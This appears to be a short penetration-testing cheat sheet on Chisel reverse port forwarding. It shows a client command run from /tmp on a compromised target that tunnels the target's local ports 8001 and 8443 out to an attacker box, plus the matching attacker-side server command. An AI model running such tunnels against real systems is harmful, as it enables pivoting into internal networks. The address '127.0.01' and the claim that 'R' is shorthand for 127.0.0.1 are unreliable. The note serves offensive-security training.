# Chisel

## Reverse
### Target
```bash
# Example command shows multiple port forwards
# You can specify one or many port forwards
# Add or remove port forward declarations as needed
/tmp/chisel client attack-box-ip:51234 R:8001:127.0.0.1:8001 R:8443:127.0.01:8443
                                               ^                     ^    
                                               |                     |___ attack-ip:attack-port:target-ip:target-port
                                               |
                                               |___ attack-ip:attack-port:target-ip:target-port
 
                                                    # "R" is shorthand for "127.0.0.1"
                                                    # Effectively, listen on 127.0.0.1 on attack box
```

### Attacker
```bash
# Chisel server listening on TCP port 51234 
./chisel server --reverse --port 51234
```